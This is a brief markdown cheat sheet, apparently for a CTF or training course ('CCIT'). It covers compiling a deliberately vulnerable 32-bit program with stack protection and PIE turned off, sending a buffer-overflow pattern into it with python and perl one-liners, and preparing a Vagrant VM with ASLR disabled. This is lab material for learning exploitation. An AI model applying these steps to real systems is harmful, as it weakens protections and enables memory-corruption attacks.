# EXAMPLES

bof 32bit compilation/exec, for CCIT:  
```
gcc -o bof -z execstack -fno-stack-protector -m32 bof.c :   
-no-pie
(python -c 'print "A"*64,"BBBB","\n"'; cat -) | ./bof :  
(perl -e 'print "A"x64,"BBBB","\n"'; cat -) | ./bof :   
mkdir 32bit
cd 32bit
vagrant init ubuntu/trusty32
vagrant up
vagrant ssh
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```